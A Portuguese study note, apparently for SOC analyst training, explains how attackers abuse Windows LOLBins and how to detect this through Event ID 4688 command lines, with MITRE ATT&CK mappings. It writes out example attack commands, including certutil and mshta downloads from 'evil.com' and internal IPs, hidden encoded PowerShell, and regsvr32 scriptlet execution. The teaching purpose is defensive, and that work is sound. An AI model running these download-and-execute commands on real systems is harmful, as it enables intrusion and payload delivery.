# LOLBins (Living Off The Land Binaries)

Esse é um dos assuntos mais importantes para um analista SOC.

Quando alguém começa em Cybersecurity, normalmente imagina malware assim:

```text
virus.exe
trojan.exe
ransomware.exe
```

Mas os atacantes modernos preferem algo muito mais eficiente:

> usar ferramentas legítimas que já existem no Windows.

Isso é o conceito de **Living Off The Land (LotL)**.

---

# O problema que os atacantes tentam resolver

Imagine que você é um atacante.

Você quer:

- executar comandos
    
- baixar arquivos
    
- persistir
    
- mover lateralmente
    
- executar payloads
    

Você tem duas opções.

## Opção 1: Baixar malware

```text
malware.exe
```

Problemas:

- antivírus pode detectar
    
- EDR pode bloquear
    
- hash fica conhecido
    
- gera IOC fácil
    

---

## Opção 2: Usar o que já existe

Windows já possui:

- PowerShell
    
- Certutil
    
- Regsvr32
    
- Rundll32
    
- Mshta
    
- WMIC
    

Todos assinados pela Microsoft.

Todos presentes na máquina.

Todos utilizados legitimamente por administradores.

Resultado:

> menos artefatos  
> menos detecção baseada em hash  
> mais evasão

---

# O que é um LOLBin?

LOLBin =

> executável legítimo do sistema operacional que pode ser abusado para atividades maliciosas.

---

# Mentalidade de SOC

Você NÃO deve pensar:

> "PowerShell = malware"

Porque isso é falso.

Você deve pensar:

> "Esse uso do PowerShell faz sentido?"

Essa pergunta muda tudo.

---

# Como detectar LOLBins?

A principal fonte é:

## Event ID 4688

Process Creation

Mostra:

- processo criado
    
- parent process
    
- usuário
    
- command line
    

---

Exemplo:

```text
New Process Name:
C:\Windows\System32\certutil.exe

Command Line:
certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe
```

O processo sozinho não é suficiente.

O ouro está na:

```text
CommandLine
```

---

# O conceito mais importante da aula

Muitos iniciantes analisam:

```text
powershell.exe
```

e param.

Analista de endpoint analisa:

```text
powershell.exe -nop -w hidden -enc SQBFAFgA...
```

Porque os argumentos contam a história.

---

# 1. PowerShell

Provavelmente o LOLBin mais famoso.

---

# O que faz legitimamente?

Automação.

Administradores usam para:

- criar usuários
    
- coletar logs
    
- gerenciar servidores
    
- automatizar tarefas
    

---

Exemplo legítimo:

```powershell
Get-Process
```

ou

```powershell
Get-Service
```

---

# Como atacantes abusam?

## Download de payload

```powershell
Invoke-WebRequest
```

---

## Execução de código

```powershell
Invoke-Expression
```

---

## Execução remota

```powershell
Invoke-Command
```

---

# Argumentos suspeitos

## -enc

Encoded Command

Exemplo:

```text
powershell.exe -enc SQBFAFgA...
```

---

Por quê?

O comando real foi convertido para Base64.

Objetivo:

- ocultar o conteúdo
    
- dificultar detecção
    

---

## -nop

No Profile

```text
powershell.exe -nop
```

Ignora perfis PowerShell.

---

Objetivo do atacante:

evitar interferências.

---

## -w hidden

Window Hidden

```text
powershell.exe -w hidden
```

Oculta a janela.

---

Objetivo:

executar sem o usuário perceber.

---

# Quando você vê isso junto

```text
powershell.exe -nop -w hidden -enc
```

Seu alerta mental deve disparar.

---

# Por quê?

Porque quase nenhum administrador trabalha assim.

---

# Certutil

Um dos favoritos dos atacantes.

---

# O que é?

Ferramenta de certificados do Windows.

Normalmente usada para:

- certificados
    
- PKI
    
- validação de assinaturas
    

---

# Uso legítimo

```cmd
certutil -hashfile arquivo.exe SHA256
```

Calcular hash.

---

# Como atacantes abusam?

Download de payload.

---

Exemplo clássico:

```cmd
certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe
```

---

# Vamos entender cada argumento

## -urlcache

Permite recuperar conteúdo de URL.

---

## -split

Divide download em partes.

---

## -f

Force.

Força sobrescrita.

---

# O que isso significa?

Na prática:

```text
Baixe esse arquivo da internet
e salve localmente
```

---

# Por que isso é suspeito?

Porque Certutil NÃO foi criado para ser downloader.

Mas pode agir como um.

---

# Detecção

Event ID 4688

CommandLine:

```text
certutil.exe -urlcache -split -f
```

---

SOC normalmente considera isso:

Alta suspeita.

---

# Mshta

Outro clássico.

---

# O que é?

Microsoft HTML Application Host.

Executa:

```text
.hta
```

---

# Uso legítimo

Aplicações administrativas antigas.

---

# Como atacantes abusam?

Executando VBScript.

---

Exemplo:

```cmd
mshta vbscript:Execute(...)
```

---

ou

```cmd
mshta http://evil.com/payload.hta
```

---

# Por que é perigoso?

Porque pode:

- baixar código
    
- executar scripts
    
- chamar PowerShell
    

---

# Quando ver mshta

Pergunte:

> Por que alguém está usando isso em 2025?

A maioria das empresas não usa mais.

---

# Rundll32

Muito importante.

---

# O que faz?

Executa funções dentro de DLLs.

---

Uso legítimo:

```cmd
rundll32.exe shell32.dll,Control_RunDLL
```

Abre itens do Painel de Controle.

---

# Como atacantes abusam?

Executam código escondido em DLLs.

---

Exemplo:

```cmd
rundll32.exe malware.dll,EntryPoint
```

---

# Problema

Não existe executável suspeito.

Só um Windows Binary legítimo.

---

# WMIC

Windows Management Instrumentation Command-line.

---

# Uso legítimo

Administração remota.

---

Exemplo:

```cmd
wmic process list
```

---

# Uso malicioso

Criar processos.

---

Exemplo:

```cmd
wmic process call create "powershell.exe ..."
```

---

Na prática:

WMIC está iniciando outro payload.

---

# Regsvr32

Outro favorito.

---

# O que faz?

Registrar DLLs COM.

---

Uso legítimo:

```cmd
regsvr32 arquivo.dll
```

---

# Uso malicioso

```cmd
regsvr32 /s /n /u script.sct
```

---

# O que significam?

|Argumento|Significado|
|---|---|
|/s|Silent|
|/n|Não chamar DllRegisterServer|
|/u|Unregister|

---

Pode ser usado para:

- executar scriptlets
    
- baixar payloads
    
- bypass de controles
    

---

# Por que LOLBins funcionam tão bem?

Porque:

- são assinados pela Microsoft
    
- já estão no sistema
    
- administradores usam
    
- antivírus não pode bloquear tudo
    

---

# O erro mais comum dos iniciantes

Ver:

```text
powershell.exe
```

e dizer:

> malware

Errado.

---

Ver:

```text
powershell.exe -nop -w hidden -enc
```

e dizer:

> comportamento compatível com execução ofuscada

Correto.

---

# Processo de investigação no SOC

Recebe alerta:

```text
Event ID: 4688

Process:
certutil.exe

CommandLine:
certutil.exe -urlcache -split -f http://10.10.10.10/payload.exe payload.exe
```

---

# Pergunta 1

O que aconteceu?

Resposta:

Certutil foi utilizado para baixar um arquivo.

---

# Pergunta 2

Por que é suspeito?

Resposta:

Porque Certutil normalmente é usado para operações de certificados, não para download de executáveis.

---

# Pergunta 3

O que investigar depois?

- URL acessada
    
- reputação do IP
    
- arquivo baixado
    
- hash
    
- processo filho
    
- execução posterior do payload
    

---

# Exemplo de evidência para escalação

Imagine este Event 4688:

```text
Process:
certutil.exe

CommandLine:
certutil.exe -urlcache -split -f http://192.168.1.50/payload.exe payload.exe
```

Evidência:

> Processo certutil.exe foi executado com os argumentos `-urlcache -split -f`, funcionalidade frequentemente utilizada para download de arquivos via HTTP.

> A linha de comando indica obtenção de arquivo externo (`payload.exe`), comportamento incompatível com o uso administrativo comum da ferramenta.

> Atividade compatível com abuso de LOLBin para download de payload e possível estágio inicial de comprometimento.

---

# Mapeamento MITRE ATT&CK

Quando estudar LOLBins, acostume-se a associar:

|LOLBin|Uso Malicioso Comum|MITRE|
|---|---|---|
|PowerShell|Execução de payload|T1059.001|
|Certutil|Download de malware|T1105|
|Mshta|Execução de HTA|T1218.005|
|Rundll32|Execução de DLL|T1218.011|
|Regsvr32|Scriptlet execution|T1218.010|
|WMIC|Execução remota/processos|T1047|

---

# Resultado que você deve atingir

Ao final deste tema, você deve conseguir olhar um Event ID 4688 e responder:

1. O processo é legítimo?
    
2. O uso é legítimo?
    
3. A command line é compatível com atividade administrativa normal?
    
4. Existe abuso de LOLBin?
    
5. Quais evidências sustentam essa conclusão?
    
6. O que deve ser investigado em seguida?
    

Quando você domina isso, começa a enxergar comportamento malicioso mesmo quando não existe malware explícito, hash conhecido ou alerta de antivírus. Isso é uma das habilidades mais valiosas em investigação de endpoint.

---

## Observando comportamento na prática

`certutil.exe -urlcache -split -f "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ee/Google_2026_logo.svg/500px-Google_2026_logo.svg.png" google_logo.png`

Na primeira execução: block do Windows Defender

![[Pasted image 20260609234937.png]]